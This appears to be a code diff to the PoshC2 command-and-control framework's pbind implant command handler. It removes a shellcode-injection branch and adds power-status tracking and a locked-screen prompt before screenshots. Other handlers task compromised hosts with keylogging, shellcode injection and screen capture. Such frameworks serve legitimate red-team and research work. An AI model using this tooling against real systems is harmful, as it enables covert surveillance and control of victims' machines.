@@ -7,6 +7,7 @@ from poshc2.client.Help import sharp_help1
 from poshc2.server.Config import PoshInstallDirectory, PoshProjectDirectory, SocksHost, PayloadsDirectory, DatabaseType
 from poshc2.server.Core import print_bad
 from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
+from poshc2.server.PowerStatus import getpowerstatus
 from prompt_toolkit import PromptSession
 from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
@@ -15,10 +16,10 @@ from prompt_toolkit.styles import Style
 
 if DatabaseType.lower() == "postgres":
     from poshc2.server.database.DBPostgres import new_task, unhide_implant, kill_implant, get_implantdetails, get_sharpurls
-    from poshc2.server.database.DBPostgres import select_item, new_c2_message, update_label, get_randomuri
+    from poshc2.server.database.DBPostgres import select_item, new_c2_message, get_powerstatusbyrandomuri, update_label, get_randomuri
 else:
     from poshc2.server.database.DBSQLite import new_task, unhide_implant, kill_implant, get_implantdetails, get_sharpurls
-    from poshc2.server.database.DBSQLite import select_item, new_c2_message, update_label, get_randomuri
+    from poshc2.server.database.DBSQLite import select_item, new_c2_message, get_powerstatusbyrandomuri, update_label, get_randomuri
 
 
 def handle_pbind_command(command, user, randomuri, implant_id):
@@ -97,25 +98,6 @@ def handle_pbind_command(command, user, randomuri, implant_id):
     elif command.startswith("hide-implant"):
         kill_implant(oldrandomuri)
 
-    elif command.startswith("inject-shellcodectx"):
-        params = re.compile("inject-shellcodectx", re.IGNORECASE)
-        params = params.sub("", command)
-        style = Style.from_dict({
-            '': '#80d130',
-        })
-        session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
-        try:
-            path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
-            path = PayloadsDirectory + path
-        except KeyboardInterrupt:
-            return
-        try:
-            shellcodefile = load_file(path)
-            if shellcodefile is not None:
-                new_task("pbind-command run-exe Core.Program Core Inject-ShellcodeCTX %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
-        except Exception as e:
-            print("Error loading file: %s" % e)
-
     elif command.startswith("inject-shellcode"):
         params = re.compile("inject-shellcode", re.IGNORECASE)
         params = params.sub("", command)
@@ -179,11 +161,37 @@ def handle_pbind_command(command, user, randomuri, implant_id):
         new_task("pbind-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
 
     elif (command.startswith("get-screenshotmulti")):
+        pwrStatus = get_powerstatusbyrandomuri(randomuri)
+        if (pwrStatus is not None and pwrStatus[7]):
+            ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+            if ri.lower() == "n" or ri.lower() == "":
+                return
         new_task(f"pbind-command {command}", user, randomuri)
         update_label("SCREENSHOT", randomuri)
 
     elif (command.startswith("get-screenshot")):
+        pwrStatus = get_powerstatusbyrandomuri(randomuri)
+        if (pwrStatus is not None and pwrStatus[7]):
+            ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+            if ri.lower() == "n" or ri.lower() == "":
+                return
         new_task(f"pbind-command {command}", user, randomuri)
+
+    elif (command == "get-powerstatus"):
+        getpowerstatus(randomuri)
+        new_task("pbind-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)
+
+    elif (command == "getpowerstatus"):
+        getpowerstatus(randomuri)
+        new_task("pbind-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)
+
+    elif (command.startswith("stop-powerstatus")):
+        new_task(f"pbind-command {command}", user, randomuri)
+        update_label("", randomuri)  
+
+    elif (command.startswith("stoppowerstatus")):
+        new_task(f"pbind-command {command}", user, randomuri)
+        update_label("", randomuri)
 
     elif (command.startswith("pslo")):
         new_task(f"pbind-{command}", user, randomuri) 
